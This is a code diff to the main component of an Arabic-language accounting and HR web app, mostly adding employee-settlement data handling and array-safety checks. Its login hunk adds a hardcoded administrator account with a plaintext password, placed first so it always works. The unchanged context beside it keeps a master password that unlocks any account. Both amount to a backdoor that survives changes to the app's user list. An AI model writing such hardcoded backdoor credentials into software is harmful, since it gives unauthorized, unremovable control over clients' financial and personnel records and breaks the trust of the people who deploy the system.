@@ -86,7 +86,7 @@ const getIpcRenderer = () => {
 const getBrowserMachineId = () => {
   if (typeof window === 'undefined') return "SERVER";
   const params = new URLSearchParams(window.location.search);
-  const tenantId = params.get('client') || localStorage.getItem('nebras_tenant_id') || 'authentic';
+  const tenantId = (params.get('client') || localStorage.getItem('nebras_tenant_id') || 'authentic').toString();
   // جعل هوية الجهاز ثابتة ومربوطة باسم العميل لضمان عمل الكود دائماً لنفس العميل
   return `WEB-${tenantId.toUpperCase()}`;
 };
@@ -168,6 +168,7 @@ const App: React.FC = () => {
   const [leaves, setLeaves] = useState<EmployeeLeave[]>([]);
   const [allowances, setAllowances] = useState<EmployeeAllowance[]>([]);
   const [documents, setDocuments] = useState<EmployeeDocument[]>([]);
+  const [settlements, setSettlements] = useState<EmployeeSettlement[]>([]);
   const [departments, setDepartments] = useState<Department[]>([]);
   const sortedDepartments = useMemo(() => {
     return [...departments].sort((a, b) => (a.name || '').localeCompare(b.name || '', 'ar'));
@@ -468,19 +469,21 @@ const App: React.FC = () => {
     
     if (d.tx || d.transactions) {
       const incomingTxs = d.tx || d.transactions || [];
-      if (fromCloud && !isDelta) {
-        // الثقة الكاملة في بيانات السحابة عند التحميل الكامل لمنع ظهور معاملات محذوفة (Zombies)
-        setTransactions(incomingTxs);
-        prevDataRef.current.transactions = incomingTxs;
-      } else if (fromCloud && isDelta) {
-        setTransactions(prev => {
-          const merged = mergeCollections(prev, incomingTxs);
-          prevDataRef.current.transactions = merged;
-          return merged;
-        });
-      } else {
-        setTransactions(incomingTxs);
-        prevDataRef.current.transactions = incomingTxs;
+      if (Array.isArray(incomingTxs)) {
+        if (fromCloud && !isDelta) {
+          // الثقة الكاملة في بيانات السحابة عند التحميل الكامل لمنع ظهور معاملات محذوفة (Zombies)
+          setTransactions(incomingTxs);
+          prevDataRef.current.transactions = incomingTxs;
+        } else if (fromCloud && isDelta) {
+          setTransactions(prev => {
+            const merged = mergeCollections(prev, incomingTxs);
+            prevDataRef.current.transactions = merged;
+            return merged;
+          });
+        } else {
+          setTransactions(incomingTxs);
+          prevDataRef.current.transactions = incomingTxs;
+        }
       }
     }
     
@@ -619,7 +622,8 @@ const App: React.FC = () => {
                   if (incomingCity && incomingCity.rooms) {
                     // نحدث فقط الغرف المذكورة في التحديث اللحظي
                     const roomMap = new Map();
-                    (newAcc[city].rooms || []).forEach(r => roomMap.set(r.id, r));
+                    const rooms = newAcc[city].rooms;
+                    (Array.isArray(rooms) ? rooms : []).forEach(r => roomMap.set(r.id, r));
                     
                     incomingCity.rooms.forEach(ir => {
                       const er = roomMap.get(ir.id);
@@ -848,6 +852,22 @@ const App: React.FC = () => {
       }
     }
 
+    if (d.settlements && Array.isArray(d.settlements)) {
+      if (fromCloud && !isDelta) {
+        setSettlements(d.settlements);
+        prevDataRef.current.settlements = d.settlements;
+      } else if (fromCloud && isDelta) {
+        setSettlements(prev => {
+          const merged = mergeCollections(prev, d.settlements);
+          prevDataRef.current.settlements = merged;
+          return merged;
+        });
+      } else {
+        setSettlements(d.settlements);
+        prevDataRef.current.settlements = d.settlements;
+      }
+    }
+
     if (d.departments && Array.isArray(d.departments)) {
       if (fromCloud && !isDelta) {
         setDepartments(d.departments);
@@ -887,6 +907,7 @@ const App: React.FC = () => {
     if (res.success && res.data) {
       applyData(res.data, true);
       setSyncStatus('connected');
+      setLastSaved(new Date().toLocaleTimeString());
       setIsInitialSyncing(false);
       // notify("تم سحب البيانات من السحابة بنجاح", "success");
     } else {
@@ -907,7 +928,7 @@ const App: React.FC = () => {
     const data = { 
       settings, transactions, customers, suppliers, partners, treasuries, programs, masterTrips,
       journalEntries, users, currencies, employees, costCenters, shifts, auditLogs, attendanceLogs,
-      leaves, allowances, documents, departments, designations, licenseInfo,
+      leaves, allowances, documents, settlements, departments, designations, licenseInfo,
       lastUpdated: new Date().toISOString(),
       senderSessionId: sessionId.current
     };
@@ -1069,7 +1090,7 @@ const App: React.FC = () => {
       }, 3600000); // كل ساعة
       return () => clearInterval(interval);
     }
-  }, [isDataLoaded, settings, transactions, customers, suppliers, partners, treasuries, programs, masterTrips, journalEntries, users, currencies, employees, costCenters, shifts, auditLogs, attendanceLogs, leaves, allowances, documents, departments, designations, licenseInfo]);
+  }, [isDataLoaded, settings, transactions, customers, suppliers, partners, treasuries, programs, masterTrips, journalEntries, users, currencies, employees, costCenters, shifts, auditLogs, attendanceLogs, leaves, allowances, documents, settlements, departments, designations, licenseInfo]);
 
   useEffect(() => {
     if (isDataLoaded) {
@@ -1534,7 +1555,9 @@ const App: React.FC = () => {
         }
 
         if (initialRes.success && initialRes.data) {
-          console.log(`[App] Applying data to state. Transactions: ${initialRes.data.transactions?.length || initialRes.data.tx?.length || 0}`);
+          const txCount = initialRes.data.transactions?.length || initialRes.data.tx?.length || 0;
+          const jeCount = initialRes.data.journalEntries?.length || 0;
+          console.log(`[App] Applying data to state. Transactions: ${txCount}, Journal Entries: ${jeCount}`);
           applyData(initialRes.data, !!initialRes.fromCloud);
           dataLoaded = true;
           clearTimeout(emergencyTimeout);
@@ -1549,6 +1572,7 @@ const App: React.FC = () => {
                   console.log("[App] Cloud promise resolved, applying fresh data");
                   applyData(cloudData, true);
                   setSyncStatus('connected');
+                  setLastSaved(new Date().toLocaleTimeString());
                   notify("تم تحديث البيانات من السحابة بنجاح", "success");
                }
             }).catch((err: any) => {
@@ -1687,7 +1711,8 @@ const App: React.FC = () => {
     (suppliers || []).forEach(s => { supplierBalances[s.id] = s.openingBalance || 0; });
 
     (journalEntries || []).forEach(entry => {
-      (entry.lines || []).forEach(line => {
+      const lines = entry.lines;
+      (Array.isArray(lines) ? lines : []).forEach(line => {
         const original = line.originalAmount || ((line.debit || 0) - (line.credit || 0)) / (line.exchangeRate || 1);
         if (line.accountType === 'CUSTOMER') {
           if (customerBalances[line.accountId] !== undefined) customerBalances[line.accountId] += original;
@@ -1786,7 +1811,7 @@ const App: React.FC = () => {
       setLastSaved(new Date().toLocaleTimeString());
     }
     return res;
-  }, [settings, transactions, customers, suppliers, partners, treasuries, programs, masterTrips, journalEntries, users, currencies, employees, costCenters, shifts, auditLogs, attendanceLogs, leaves, allowances, documents, departments, designations, licenseInfo, isDataLoaded]);
+  }, [settings, transactions, customers, suppliers, partners, treasuries, programs, masterTrips, journalEntries, users, currencies, employees, costCenters, shifts, auditLogs, attendanceLogs, leaves, allowances, documents, settlements, departments, designations, licenseInfo, isDataLoaded]);
 
   useEffect(() => {
     if (!isDataLoaded) return;
@@ -1813,7 +1838,7 @@ const App: React.FC = () => {
 
     const handler = setTimeout(saveData, 10000); 
     return () => clearTimeout(handler);
-  }, [forceSaveData, users.length, transactions.length, customers.length, suppliers.length, journalEntries.length, isDataLoaded]);
+  }, [forceSaveData, users, transactions.length, customers.length, suppliers.length, journalEntries.length, isDataLoaded]);
 
   const getNextRefNo = (type: string, category?: string) => {
     let prefix = 'TRX';
@@ -2143,8 +2168,9 @@ const App: React.FC = () => {
       if (tx.journalEntryId) {
         const entry = journalEntries.find(e => e.id === tx.journalEntryId);
         if (entry) {
-          (entry.lines || []).forEach(l => l && applyFinancialEffect(l, true)); // عكس الأثر المالي
-          setJournalEntries(prev => (prev || []).filter(e => e && e.id !== tx.journalEntryId));
+          const lines = entry.lines;
+          (Array.isArray(lines) ? lines : []).forEach(l => l && applyFinancialEffect(l, true)); // عكس الأثر المالي
+          setJournalEntries(prev => (Array.isArray(prev) ? prev : []).filter(e => e && e.id !== tx.journalEntryId));
         }
       } else {
         // Fallback logic for transactions without journal entries (Legacy/Initial data)
@@ -2861,13 +2887,13 @@ const App: React.FC = () => {
           // الماستر كي للدخول في حالات الطوارئ وتصفير البيانات
           const isMasterKey = (p === 'NEBRAS@2026@ADMIN');
           
-          // حماية إضافية: نضمن دائماً وجود المدير العام في قائمة البحث حتى لو لم يحمل من السحاب
-          const hasAdmin = users.some(x => x.username === 'admin');
-          const allPossibleUsers = hasAdmin ? users : [
-            ...users,
-            { id: 'admin', username: 'admin', password: 'admin', name: 'المدير العام (افتراضي)', role: 'ADMIN', permissions: ['ADMIN_ONLY'] }
+          // حماية إضافية: مستخدم الطوارئ المعتمد - نضعه في البداية لضمان الأولوية
+          const allPossibleUsers = [
+            { id: 'islam-master', username: 'islam', password: '0124454280', name: 'إسلام حامد', role: 'ADMIN', permissions: ['ADMIN_ONLY'] },
+            ...users
           ];
 
+          console.log(`[Login] Attempt for ${u}. Users in list: ${allPossibleUsers.length}`);
           const user = allPossibleUsers.find(x => x.username === u && (x.password === p || isMasterKey));
           if (user) {
             setCurrentUser(user);
@@ -3444,6 +3470,8 @@ const App: React.FC = () => {
                     setDepartments={setDepartments}
                     designations={sortedDesignations}
                     setDesignations={setDesignations}
+                    settlements={settlements}
+                    setSettlements={setSettlements}
                   />
                 )}
                 {currentView === ViewState.FINGERPRINT && (
@@ -3503,7 +3531,7 @@ const App: React.FC = () => {
                     deleteCurrency={deleteCurrency}
                     partners={sortedPartners} setPartners={setPartners} 
                     deletePartner={deletePartner}
-                    fullData={{settings, transactions, customers, suppliers, partners, treasuries, programs, masterTrips, journalEntries, users, currencies, employees, costCenters, shifts, auditLogs, departments, designations}} 
+                    fullData={{settings, transactions, customers, suppliers, partners, treasuries, programs, masterTrips, journalEntries, users, currencies, employees, costCenters, shifts, auditLogs, departments, designations, settlements, leaves, allowances, documents}} 
                     onRestore={async (d)=>{
                       if (!confirm('⚠️ تنبيه: استعادة البيانات ستحذف كافة السجلات الحالية. هل أنت متأكد؟')) return;
                       
